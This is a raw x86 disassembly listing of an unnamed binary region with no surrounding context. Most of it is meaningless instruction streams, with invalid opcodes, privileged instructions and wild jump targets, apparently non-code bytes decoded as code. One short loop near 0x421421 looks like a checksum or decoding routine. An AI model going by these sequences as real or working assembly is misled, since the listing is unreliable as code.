  4211f6:	cmc    
  4211f7:	gs retf 
  4211f9:	jne    0x42121c
  4211fb:	cli    
  4211fc:	fistp  WORD PTR [esi+0x87e7b57]
  421202:	xchg   BYTE PTR [ebp-0x654ecc68],bh
  421208:	int    0xa
  42120a:	fst    QWORD PTR [ecx+ecx*4-0x4c89c635]
  421211:	sti    
  421212:	xchg   ecx,eax
  421213:	lds    eax,FWORD PTR [edi+0x20fd09c0]
  421219:	arpl   WORD PTR [eax+eiz*1],bp
  42121c:	sub    eax,0x864f3009
  421221:	shl    DWORD PTR [esp+ecx*4-0x1d],0x36
  421226:	cwde   
  421227:	and    eax,0x57021cc2
  42122c:	call   0x2c7c:0x9566d0b4
  421233:	and    dl,ah
  421235:	xchg   esi,eax
  421236:	ss cli 
  421238:	sti    
  421239:	cmovp  edx,DWORD PTR [eax]
  42123c:	pop    esi
  42123d:	scas   eax,DWORD PTR es:[edi]
  42123e:	(bad)  
  42123f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421240:	mov    bh,BYTE PTR [ebp+0x27ab14d5]
  421246:	aas    
  421247:	lock pop ss
  421249:	push   edx
  42124a:	inc    ecx
  42124b:	sbb    DWORD PTR [ebx-0x14e7279c],esi
  421251:	xor    BYTE PTR [edi-0x42575db2],dl
  421257:	jge    0x421271
  421259:	aaa    
  42125a:	add    eax,0x8df930d2
  42125f:	xchg   ebp,eax
  421260:	pop    ebx
  421261:	inc    esp
  421262:	sahf   
  421263:	inc    esi
  421264:	pop    ss
  421265:	inc    ebp
  421266:	sti    
  421267:	cmp    ch,ch
  421269:	out    dx,eax
  42126a:	mov    cl,0xa7
  42126c:	test   esi,0x2aada6d3
  421272:	or     esp,esi
  421274:	stc    
  421275:	stos   BYTE PTR es:[edi],al
  421276:	in     eax,0xd5
  421278:	push   0x83fb2bba
  42127d:	mov    BYTE PTR [ebx],dh
  42127f:	push   ecx
  421280:	or     BYTE PTR [esi-0x44ed73a6],bl
  421286:	jg     0x4212c1
  421288:	mov    esp,0x36a1b0d4
  42128d:	not    BYTE PTR [edi+0x3a351773]
  421293:	dec    esp
  421294:	mov    ds:0xb7fc981e,eax
  421299:	cld    
  42129a:	mov    cl,0xbc
  42129c:	push   ss
  42129d:	pop    ss
  42129e:	mov    ah,0x2c
  4212a0:	pop    edx
  4212a1:	jo     0x42125c
  4212a3:	adc    DWORD PTR ds:0x50ca9d7e,0xffffffaa
  4212aa:	push   es
  4212ab:	adc    eax,0x10b3c82e
  4212b0:	cs sub ah,bl
  4212b3:	push   ss
  4212b4:	jnp    0x42124f
  4212b6:	xchg   ebp,eax
  4212b7:	jmp    0x357c5c15
  4212bc:	xchg   BYTE PTR [edx],bl
  4212be:	mov    esi,DWORD PTR es:[edi-0x623260e4]
  4212c5:	retf   
  4212c6:	push   ebp
  4212c7:	pop    esp
  4212c8:	hlt    
  4212c9:	sbb    BYTE PTR [edi+0x7640f02c],dl
  4212cf:	call   0x7df507d2
  4212d4:	je     0x42132f
  4212d6:	popa   
  4212d7:	jmp    0x421347
  4212d9:	xor    dh,dl
  4212db:	lds    esp,FWORD PTR [ebx+0x33]
  4212de:	imul   esi,DWORD PTR [edx+0x44042ab8],0xffffffe7
  4212e5:	or     DWORD PTR [esp+esi*8-0x1d],ebp
  4212e9:	add    al,0xf0
  4212eb:	mov    eax,0x1f8f96cf
  4212f0:	sbb    dh,0x8e
  4212f3:	stos   BYTE PTR es:[edi],al
  4212f4:	shr    BYTE PTR [ebp-0x6b2534b4],1
  4212fa:	fcmovbe st,st(4)
  4212fc:	sbb    eax,0x97597162
  421301:	ja     0x421331
  421303:	pop    ds
  421304:	out    0x3c,eax
  421306:	sbb    BYTE PTR [ebx],0xb6
  421309:	push   es
  42130a:	sbb    al,0x28
  42130c:	xchg   BYTE PTR [eax+0x40],bh
  42130f:	idiv   DWORD PTR [ecx]
  421311:	push   esp
  421312:	not    BYTE PTR [ebx]
  421314:	jne    0x4212ed
  421316:	mov    esi,0x5e99d2b1
  42131b:	jge    0x421382
  42131d:	mov    bl,0x14
  42131f:	call   0x99773b24
  421324:	mov    dl,0x5a
  421326:	retf   0x2ec8
  421329:	repz sub eax,0xa2d710c3
  42132f:	sbb    DWORD PTR [ecx-0x29],ebx
  421332:	xchg   esi,eax
  421333:	imul   ebx,DWORD PTR [edx+0x36d70c9],0x2dbdd0ce
  42133d:	loopne 0x421325
  42133f:	xchg   edx,eax
  421340:	push   ebx
  421341:	loop   0x421346
  421343:	test   eax,0xad69b9a2
  421348:	add    esi,DWORD PTR [eax]
  42134a:	mov    esp,0xe8c4a3fc
  42134f:	adc    bl,BYTE PTR [ebx]
  421351:	sahf   
  421352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421353:	adc    al,0x24
  421355:	inc    ecx
  421356:	adc    dh,0xca
  421359:	push   cs
  42135a:	or     eax,0x1f132090
  42135f:	rol    edx,0x94
  421362:	hlt    
  421363:	mov    dh,0xa3
  421365:	rol    BYTE PTR [edx],cl
  421367:	(bad)  
  421368:	adc    al,BYTE PTR [edi]
  42136a:	jno    0x421364
  42136c:	inc    eax
  42136d:	and    DWORD PTR [edi+ebp*4-0x78b7791e],esi
  421374:	outs   dx,BYTE PTR ds:[esi]
  421375:	cld    
  421376:	out    0x13,al
  421378:	mov    al,ds:0x6bb3a915
  42137d:	ret    
  42137e:	pop    ds
  42137f:	aad    0xcd
  421381:	push   eax
  421382:	rcl    eax,cl
  421384:	fs push ds
  421386:	xor    esp,DWORD PTR [edi]
  421388:	fcom   QWORD PTR [edi+edi*4]
  42138b:	add    bl,BYTE PTR [esi-0x2b]
  42138e:	(bad)  
  42138f:	cmp    esp,ebp
  421391:	xor    BYTE PTR [ecx],ah
  421393:	into   
  421394:	mov    esp,DWORD PTR [ecx]
  421396:	add    esp,DWORD PTR [eax+0x1c]
  421399:	mov    edx,0xd1bba6a1
  42139e:	jbe    0x4213d9
  4213a0:	cmp    eax,0x3d0abc7b
  4213a5:	sbb    eax,0x74ebc2ba
  4213aa:	ja     0x4213a5
  4213ac:	adc    al,0xa5
  4213ae:	jnp    0x4213a4
  4213b0:	fcomip st,st(6)
  4213b2:	mov    DWORD PTR [esp+ebp*2-0x7482032f],edx
  4213b9:	adc    al,BYTE PTR [ecx]
  4213bb:	ins    BYTE PTR es:[edi],dx
  4213bc:	cmp    dh,cl
  4213be:	pushf  
  4213bf:	sti    
  4213c0:	shr    BYTE PTR [eax+0x42],cl
  4213c3:	icebp  
  4213c4:	fwait
  4213c5:	inc    ebp
  4213c6:	mov    ?,WORD PTR ds:[eax+0x31]
  4213ca:	pop    ss
  4213cb:	mov    eax,fs:0x8e8860ce
  4213d1:	push   esi
  4213d2:	dec    eax
  4213d3:	into   
  4213d4:	adc    ch,BYTE PTR [edx+eax*4-0x1579e920]
  4213db:	int    0x26
  4213dd:	retf   0xb0fc
  4213e0:	xchg   ecx,eax
  4213e1:	mov    DWORD PTR [eax+0x43],ecx
  4213e4:	add    ch,BYTE PTR [ebx-0x55]
  4213e7:	in     eax,0x83
  4213e9:	pusha  
  4213ea:	jns    0x42138c
  4213ec:	cwde   
  4213ed:	xor    al,0x6e
  4213ef:	shl    ch,1
  4213f1:	xchg   ebx,eax
  4213f2:	pop    es
  4213f3:	jmp    0xc30f:0x3d9242ee
  4213fa:	inc    ebx
  4213fb:	popa   
  4213fc:	mov    ebp,0xbe1c4cc5
  421401:	dec    ecx
  421402:	int    0xf9
  421404:	dec    edx
  421405:	sbb    dl,BYTE PTR [ecx]
  421407:	fiadd  WORD PTR [esi]
  421409:	lea    edx,[ecx]
  42140b:	adc    BYTE PTR [eax+0x4d8b422c],cl
  421411:	or     BYTE PTR [ebx],dh
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0x712a88e2
  42147c:	xchg   esp,eax
  42147d:	fnsave [edi-0x33]
  421480:	add    DWORD PTR [eax],eax
  421482:	pop    ebx
  421483:	add    BYTE PTR [eax],al
  421485:	add    bh,ch
  421487:	push   eax
  421488:	rol    DWORD PTR [ecx+ebp*8],1
  42148b:	jae    0x421483
  42148d:	out    dx,al
  42148e:	xchg   DWORD PTR [eax],ebx
  421490:	mov    ds:0x2d4ddb70,al
  421495:	mov    ebx,0x411288bf
  42149a:	iret   
  42149b:	lds    eax,FWORD PTR [eax-0x7]
  42149e:	dec    eax
  42149f:	xchg   DWORD PTR [esp+eiz*2-0x72468665],edx
  4214a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214a7:	mov    al,ds:0x114f0f97
  4214ac:	scas   eax,DWORD PTR es:[edi]
  4214ad:	mov    ecx,0x84be09b0
  4214b2:	pop    ebx
  4214b3:	jbe    0x421534
  4214b5:	dec    edx
  4214b6:	fistp  WORD PTR [edi+0xf]
  4214b9:	test   DWORD PTR [ebx+0x3a],ebx
  4214bc:	inc    edi
  4214bd:	adc    dl,BYTE PTR [ecx-0xd]
  4214c0:	dec    esp
  4214c1:	adc    BYTE PTR [ebx],bl
  4214c3:	fnstenv [eax-0x69]
  4214c6:	jns    0x42148e
  4214c8:	add    al,0xef
  4214ca:	mov    ch,0x73
  4214cc:	inc    eax
  4214cd:	rol    DWORD PTR [edi-0x28],0x1a
  4214d1:	xchg   ebx,eax
  4214d2:	mov    bh,0xd2
  4214d4:	loop   0x4214b3
  4214d6:	imul   edi,DWORD PTR [edx+eiz*2],0x921747b6
  4214dd:	push   ecx
  4214de:	jg     0x42152e
  4214e0:	fadd   DWORD PTR [eax]
	...
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xbe066df3
  4214fe:	ror    ch,cl
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    ebx
  421503:	add    BYTE PTR [eax],al
  421505:	add    BYTE PTR [ebp+edx*8+0x26b08968],bl
  42150c:	imul   edi,DWORD PTR [eax+0x5],0xffffffb8
  421510:	inc    esp
  421511:	stc    
  421512:	bnd jle 0x421557
  421515:	inc    edi
  421516:	scas   eax,DWORD PTR es:[edi]
  421517:	lock shr WORD PTR [eax+0x6ffab51a],1
  42151f:	ins    DWORD PTR es:[edi],dx
  421520:	add    eax,eax
  421522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421523:	repnz popa 
  421525:	mov    ah,0x26
  421527:	jmp    0x6f4109fe
  42152c:	inc    ebx
  42152d:	add    dl,cl
  42152f:	fiadd  WORD PTR [ebp+0x21]
  421532:	mov    eax,0xd3524622
  421537:	ror    DWORD PTR [eax-0x39],cl
  42153a:	pop    eax
  42153b:	adc    BYTE PTR [esp+edx*8-0x77f55f51],dh
  421542:	add    ebp,DWORD PTR [ebp+0x33cbbcb8]
  421548:	fbstp  TBYTE PTR [ebp+0x1]
  42154b:	lock push eax
  42154d:	mov    ds:0x3addd663,eax
  421552:	repz or BYTE PTR [ecx],dh
  421555:	xchg   DWORD PTR fs:[edi-0x26e12cc6],edi
  42155c:	aad    0x62
  42155e:	pop    es
  42155f:	std    
  421560:	xchg   BYTE PTR [eax],al
	...
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0x423c2e3e],0x2d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    ebx
  421583:	add    BYTE PTR [eax],al
  421585:	add    BYTE PTR [ebx+0x52],bh
  421588:	xor    ch,cl
  42158a:	sahf   
  42158b:	cmp    al,0xf4
  42158d:	in     al,dx
  42158e:	mov    edx,0x285ab3a1
  421593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421594:	xor    eax,0x91f456a8
  421599:	ret    
  42159a:	add    ecx,edi
  42159c:	int    0xdc
  42159e:	imul   esp,DWORD PTR [eax+0x5e6432b5],0xffffffb9
  4215a5:	sub    cl,ch
  4215a7:	test   al,0xe
  4215a9:	push   edx
  4215aa:	pop    ebp
  4215ab:	outs   dx,DWORD PTR ds:[esi]
  4215ac:	ss fwait
  4215ae:	sub    eax,esi
  4215b0:	mov    ah,0x99
  4215b2:	xor    bh,ah
  4215b4:	jmp    0x421543
  4215b6:	clc    
  4215b7:	sbb    DWORD PTR [edi],esi
  4215b9:	ss je  0x4215aa
  4215bc:	das    
  4215bd:	cld    
  4215be:	mov    dl,0xa6
  4215c0:	das    
  4215c1:	sbb    bl,BYTE PTR [edi]
  4215c3:	stos   BYTE PTR es:[edi],al
  4215c4:	mov    cl,0xa
  4215c6:	mov    esi,0x533934b4
  4215cb:	jbe    0x4215ec
  4215cd:	repnz (bad) 
  4215cf:	fcmove st,st(4)
  4215d1:	lahf   
  4215d2:	aad    0xa2
  4215d4:	into   
  4215d5:	out    dx,eax
  4215d6:	mov    al,ds:0x82b48b6
  4215db:	add    ebp,esp
  4215dd:	fisubr WORD PTR [edi+0x1d72]
	...
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	xchg   ecx,eax
  4215fb:	jae    0x4215eb
  4215fd:	popa   
  4215fe:	mov    dh,cl
  421600:	add    DWORD PTR [eax],eax
  421602:	pop    ebx
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [esi+0x10],dl
  421608:	outs   dx,DWORD PTR ds:[esi]
  421609:	jle    0x421629
  42160b:	pusha  
  42160c:	scas   al,BYTE PTR es:[edi]
  42160d:	pop    esp
  42160e:	push   edi
  42160f:	aaa    
  421610:	popa   
  421611:	mov    ch,ch
  421613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421614:	jns    0x42162e
  421616:	adc    DWORD PTR [eax],0x67
  421619:	scas   eax,DWORD PTR es:[edi]
  42161a:	jp     0x421635
  42161c:	in     al,dx
  42161d:	pop    ebp
  42161e:	(bad)  
  42161f:	retf   0xd26a
  421622:	and    BYTE PTR [esi-0x22],dl
  421625:	les    edx,FWORD PTR [edx+0x4a]
  421628:	mov    eax,0xdf72ac28
  42162d:	dec    esi
  42162e:	push   ds
  42162f:	in     al,dx
  421630:	int    0xb3
  421632:	je     0x42164a
  421634:	aaa    
  421635:	cwde   
  421636:	test   eax,0x1c19fd1b
  42163b:	retf   
  42163c:	rol    DWORD PTR [ecx-0x6f],1
  42163f:	sar    esi,1
  421641:	mov    ebp,0x4f3db429
  421646:	icebp  
  421647:	xor    eax,0x66daa997
  42164c:	(bad)  
  42164d:	lea    ecx,ds:0xbcbca534
  421653:	sub    eax,0x592fb043
  421658:	repnz ins BYTE PTR es:[edi],dx
  42165a:	cmp    al,0x8c
  42165c:	shl    cl,cl
  42165e:	mov    bl,0xd4
  421660:	fadd   QWORD PTR [eax]
	...
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xcc1ba05d,al
  42167e:	jecxz  0x42164e
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    ebx
  421683:	add    BYTE PTR [eax],al
  421685:	add    BYTE PTR [eax],bh
  421687:	mov    al,ds:0x1bc02692
  42168c:	jmp    0x42cc266a
  421691:	xor    BYTE PTR [edi+0x12],cl
  421694:	lods   eax,DWORD PTR ds:[esi]
  421695:	cld    
  421696:	pusha  
  421697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421698:	push   ebp
  421699:	inc    ebp
  42169a:	fmul   st(1),st
  42169c:	pushf  
  42169d:	mov    edx,0xd8892d26
  4216a2:	es mov ebx,0xc07d3253
  4216a8:	(bad)  
  4216a9:	scas   al,BYTE PTR es:[edi]
  4216aa:	jns    0x4216cf
  4216ac:	xchg   BYTE PTR [ebx-0x74],al
  4216af:	jbe    0x4216b4
  4216b1:	pop    ebx
  4216b2:	pop    DWORD PTR [edi-0x2d9a010d]
  4216b8:	fsub   st,st(4)
  4216ba:	ret    
  4216bb:	lods   eax,DWORD PTR ds:[esi]
  4216bc:	imul   ecx,DWORD PTR [esi+0x665c82bc],0xffffffaf
  4216c3:	mov    ah,0x70
  4216c5:	mov    dl,BYTE PTR [ebx+ecx*8]
  4216c8:	and    bh,ah
  4216ca:	in     al,0x7d
  4216cc:	mov    esp,0x368f1de3
  4216d1:	(bad)
  4216d4:	pop    esp
  4216d5:	fwait
  4216d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216d7:	and    eax,0x20239229
  4216dc:	or     DWORD PTR [edx+0x6014c5],ebp
	...
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	imul   BYTE PTR [edi]
  4216fc:	pop    ss
  4216fd:	sahf   
  4216fe:	ds iret 
  421700:	add    DWORD PTR [eax],eax
  421702:	pop    ebx
  421703:	add    BYTE PTR [eax],al
  421705:	add    BYTE PTR [ebp+0x50],cl
  421708:	leave  
  421709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42170a:	inc    esp
  42170b:	fidiv  WORD PTR [edi-0x3f75fa6c]
  421711:	add    edx,DWORD PTR fs:0xc364df06
  421718:	push   ebx
  421719:	cvtpi2ps xmm6,QWORD PTR [eax-0x9666d69]
  421720:	sub    BYTE PTR ds:0xa60c297c,0x58
  421727:	leave  
  421728:	add    dl,BYTE PTR [edx+0x7f]
  42172b:	push   edx
  42172c:	push   es
  42172d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42172e:	ins    BYTE PTR es:[edi],dx
  42172f:	pop    esp
  421730:	jmp    0xe7ab:0xd893f428
  421737:	clc    
  421738:	mov    al,ds:0x67e315c5
  42173d:	xor    bl,BYTE PTR [ecx+ebx*4-0x2998875a]
  421744:	jns    0x4217b6
  421746:	inc    edi
  421747:	xchg   esi,eax
  421748:	shl    ecx,0xa9
  42174b:	aas    
  42174c:	push   ecx
  42174d:	test   BYTE PTR [ecx],ch
  42174f:	nop
  421750:	cwde   
  421751:	xor    eax,0xd34d9600
  421756:	jmp    0x4aeaf63c
  42175b:	jge    0x4217d0
  42175d:	xor    dh,al
  42175f:	not    DWORD PTR [ebx+0x0]
	...
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x866a4e09
  42177b:	sub    al,0xd2
  42177d:	or     eax,0x1cf99
  421782:	pop    ebx
  421783:	add    BYTE PTR [eax],al
  421785:	add    BYTE PTR [ecx+ebp*4],dh
  421788:	pop    es
  421789:	or     al,0x41
  42178b:	xor    eax,0x3f51fcf
  421790:	test   eax,0x98594dbb
  421795:	jmp    0x421742
  421797:	pop    ecx
  421798:	cld    
  421799:	gs xchg esi,eax
  42179b:	mov    eax,ds:0xf71723f8
  4217a0:	popa   
  4217a1:	fs inc ebx
  4217a3:	std    
  4217a4:	clc    
  4217a5:	cs pop ebx
  4217a7:	imul   ecx,DWORD PTR [ebx],0xffffffeb
  4217aa:	dec    ebp
  4217ab:	push   edi
  4217ac:	iret   
  4217ad:	mov    ebx,0xe65b1158
  4217b2:	(bad)  ds:0xa0d35805
  4217b8:	cli    
  4217b9:	aad    0xaf
  4217bb:	pop    esp
  4217bc:	xlat   BYTE PTR ds:[ebx]
  4217bd:	cmc    
  4217be:	ja     0x421781
  4217c0:	gs push 0x6d
  4217c3:	fnstcw WORD PTR [ecx+esi*4-0x24]
  4217c7:	or     DWORD PTR [ebx+ebp*4-0x265a1930],ebp
  4217ce:	mov    ah,0xb
  4217d0:	jne    0x42181b
  4217d2:	pop    ecx
  4217d3:	xlat   BYTE PTR ds:[ebx]
  4217d4:	mov    ch,0x3a
  4217d6:	(bad)  
  4217d7:	jnp    0x4217a4
  4217d9:	inc    ebx
  4217da:	shl    BYTE PTR [ecx-0x4d],cl
  4217dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217de:	xor    DWORD PTR [edi-0x2f],esp
	...
  4217ed:	add    BYTE PTR [edx],dl
  4217ef:	mov    edx,0xe6f8c6d8
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	and    ah,dl
  4217fc:	and    BYTE PTR [esi+0x4],cl
  4217ff:	loope  0x421802
  421801:	add    BYTE PTR [ebx+0x0],bl
  421804:	add    BYTE PTR [eax],al
  421806:	inc    eax
  421807:	jp     0x42187d
  421809:	rcl    DWORD PTR ds:0x1e3db7d3,0x2e
  421810:	xlat   BYTE PTR ds:[ebx]
  421811:	and    al,0xc1
  421813:	aas    
  421814:	mov    al,ds:0x736a1efc
  421819:	add    BYTE PTR [edx-0x4f796dfc],dl
  42181f:	test   al,0xf1
  421821:	or     eax,0x6887f6d3
  421826:	xor    BYTE PTR [esi+0x59],dl
  421829:	idiv   BYTE PTR [eax+0x2f0be634]
  42182f:	pushf  
  421830:	pop    esp
  421831:	add    BYTE PTR [edx],dh
  421833:	dec    esp
  421834:	repnz into 
  421836:	cmp    bl,al
  421838:	or     eax,0x20db9251
  42183d:	call   0x9958:0xd8a44d54
  421844:	mov    DWORD PTR [edx+ebp*8+0x209cdceb],ebx
  42184b:	fld    TBYTE PTR [edi+0x274fa8dc]
  421851:	ds mov eax,0x166c851d
  421857:	xchg   esi,eax
  421858:	arpl   bp,bp
  42185a:	ret    
  42185b:	inc    ecx
  42185c:	push   esi
  42185d:	push   esi
  42185e:	jb     0x4217e7
  421860:	data16 add BYTE PTR [eax],al
	...
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	xchg   ebx,eax
  42187b:	mov    al,ds:0xe15fc27b
  421880:	add    DWORD PTR [eax],eax
  421882:	pop    ebx
  421883:	add    BYTE PTR [eax],al
  421885:	add    BYTE PTR [ebx],al
  421887:	daa    
  421888:	mov    ebp,0xfb13d684
  42188d:	mov    fs,WORD PTR [esi-0x41]
  421890:	pop    ebp
  421891:	in     al,0x67
  421893:	or     dh,BYTE PTR [esi-0x1f]
  421896:	push   ebx
  421897:	sbb    al,0x3f
  421899:	mov    ds:0x72073fe9,eax
  42189e:	stc    
  42189f:	nop
  4218a0:	push   0xc9c2c26c
  4218a5:	sahf   
  4218a6:	xchg   DWORD PTR [edx-0x1c716188],esi
  4218ac:	mov    dl,0xbf
  4218ae:	cli    
  4218af:	and    eax,0x47e33b7b
  4218b4:	in     al,0xe5
  4218b6:	sbb    BYTE PTR gs:[ebp*8+0x4f0d7712],ch
  4218be:	cli    
  4218bf:	mov    edi,0x928770d2
  4218c4:	sbb    ebx,edx
  4218c6:	mov    ds:0x643b03e5,eax
  4218cb:	cmp    eax,0x4cd471e5
  4218d0:	clc    
  4218d1:	push   ds
  4218d2:	pop    edi
  4218d3:	xor    BYTE PTR [esi],ah
  4218d5:	sbb    BYTE PTR ds:0x58dec2de,0x2a
  4218dc:	dec    ebx
  4218dd:	cmp    eax,0x5bcbde
	...
  4218ee:	addr16 (bad) 
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x5d8eda72
  4218fc:	pop    ebp
  4218fd:	lods   al,BYTE PTR ds:[esi]
  4218fe:	mov    edx,0x5b0001e1
  421903:	add    BYTE PTR [eax],al
  421905:	add    BYTE PTR ds:0x231db310,bl
  42190b:	int    0x6d
  42190d:	sbb    eax,0xfe537dc0
  421912:	aad    0x9f
  421914:	stc    
  421915:	jmp    0xa7a6bbdc
  42191a:	adc    esp,DWORD PTR [ebx+0x68]
  42191d:	jo     0x421956
  42191f:	fidivr DWORD PTR [edi+0xf]
  421922:	ds sbb al,0x85
  421925:	xor    al,0xe9
  421927:	mov    bh,0x2f
  421929:	mov    bh,0xdb
  42192b:	fidiv  WORD PTR [edx]
  42192d:	enter  0x4dc3,0xdc
  421931:	das    
  421932:	push   cs
  421933:	call   FWORD PTR [ebp-0x40]
  421936:	add    DWORD PTR [esi+0x18],edx
  421939:	test   DWORD PTR [edi],ebp
  42193b:	lock cmp al,ah
  42193e:	and    dh,BYTE PTR [edi]
  421940:	jnp    0x421954
  421942:	dec    edi
  421943:	xor    eax,0x4b7535d5
  421948:	repz mov ecx,0xa7cece63
  42194e:	jae    0x421920
  421950:	xchg   edi,eax
  421951:	xchg   ecx,eax
  421952:	retf   0x536f
  421955:	dec    edx
  421956:	jg     0x4219a6
  421958:	cmp    BYTE PTR [ecx+0x6841e861],ch
  42195e:	push   es
  42195f:	or     bh,BYTE PTR [esi]
	...
  42196d:	add    bl,al
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0xd09b1347,eax
  42197d:	mov    ds:0x1e215,al
  421982:	pop    ebx
  421983:	add    BYTE PTR [eax],al
  421985:	add    BYTE PTR [edx],ah
  421987:	inc    ecx
  421988:	mov    bl,0xed
  42198a:	fwait
  42198b:	push   esp
  42198c:	test   BYTE PTR [esi],0x8d
  42198f:	jno    0x421a00
  421991:	mov    ch,0xff
  421993:	scas   al,BYTE PTR es:[edi]
  421994:	mov    esp,0xbaeeb5d4
  421999:	sub    eax,0x69ade375
  42199e:	fadd   DWORD PTR [esi-0x404fbf33]
  4219a4:	dec    ebp
  4219a5:	hlt    
  4219a6:	xor    dh,BYTE PTR [edx+0x57]
  4219a9:	sbb    dl,BYTE PTR cs:[esi+0x671d741e]
  4219b0:	in     al,0x6c
  4219b2:	cmp    bh,ah
  4219b4:	push   eax
  4219b5:	stos   BYTE PTR es:[edi],al
  4219b6:	out    dx,al
  4219b7:	mov    BYTE PTR [eax+ebp*4+0x36],0xc7
  4219bc:	outs   dx,DWORD PTR ds:[esi]
  4219bd:	pop    ss
  4219be:	loop   0x421979
  4219c0:	test   DWORD PTR ds:0x57fbbda7,eax
  4219c6:	lock mov edi,0xe0e3edc8
  4219cc:	jg     0x4219a0
  4219ce:	ror    BYTE PTR [ecx+0x466b39e5],cl
  4219d4:	nop
  4219d5:	sbb    DWORD PTR [ebp+0x18],ebx
  4219d8:	sub    bl,ch
  4219da:	inc    ebx
  4219db:	(bad)  
  4219dd:	sub    eax,0x539a6b
	...
  4219ee:	fld    st(2)
  4219f0:	add    eax,0xddcf1f49
  4219f5:	ror    al,cl
  4219f7:	outs   dx,DWORD PTR ds:[esi]
  4219f8:	clc    
  4219f9:	shl    BYTE PTR [ebp+0x70cf47fd],cl
  4219ff:	loop   0x421a02
  421a01:	add    BYTE PTR [ecx+0x0],cl
  421a04:	add    BYTE PTR [eax],al
  421a06:	call   0xbac68cb
  421a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a0c:	shl    DWORD PTR [ebx],0xa4
  421a0f:	(bad)  [esi-0x66]
  421a13:	out    dx,al
  421a14:	loopne 0x421a0a
  421a16:	cwde   
  421a17:	jle    0x421a8f
  421a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a1a:	sbb    DWORD PTR [ebx-0xa],edi
  421a1d:	push   esp
  421a1e:	(bad)  
  421a1f:	jl     0x421a64
  421a21:	jns    0x4219f8
  421a23:	iret   
  421a24:	retf   0x48b8
  421a27:	sbb    al,0xd0
  421a29:	mov    esp,0xe80b7d59
  421a2e:	lahf   
  421a2f:	or     DWORD PTR [ecx],esi
  421a31:	fimul  DWORD PTR [edx]
  421a33:	pop    esi
  421a34:	xchg   ch,bh
  421a36:	jb     0x421a47
  421a38:	cli    
  421a39:	mov    cs,WORD PTR [edx]
  421a3b:	or     eax,0xe4e6b7f2
  421a40:	sti    
  421a41:	jg     0x421a54
  421a43:	stc    
  421a44:	fs popf 
